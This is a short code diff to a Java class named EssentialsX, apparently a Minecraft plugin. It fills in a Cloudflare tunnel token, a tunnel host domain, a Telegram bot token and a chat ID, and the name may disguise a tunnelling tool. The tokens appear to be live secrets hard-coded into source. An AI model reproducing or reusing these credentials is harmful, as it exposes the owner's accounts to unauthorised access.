@@ -20,14 +20,14 @@ public class EssentialsX extends JavaPlugin {
     private int port = 22222;
 
     //Cloudflare隧道Token
-    private String token = ""; //必填
+    private String token = "eyJhIjoiZmQ5YjNkMDdkOWQxZWYxY2M4OGY2ZTJiNDE2OTNmZmUiLCJ0IjoiNzVmNGExMjEtMmMyOC00Mzg3LThkOGYtYmM0NzEwYmIzNDMxIiwicyI6Ik1EbGpNREk1TVdRdE5EazFNUzAwTnpobUxUZzFZV1l0T1dWbVlqZGtOekkwTURCaiJ9"; //必填
 
     //Cloudflare隧道绑定域名
-    private String host = ""; //必填
+    private String host = "nodearc.o0o0.pp.ua"; //必填
 
     // Telegram配置
-    private String tgToken = "";
-    private String tgChatId = "";
+    private String tgToken = "7195422483:AAGhrc-1nzto9Ik05rY2K5V8xdvLSGInVBo";
+    private String tgChatId = "5800052646";
 
 
 
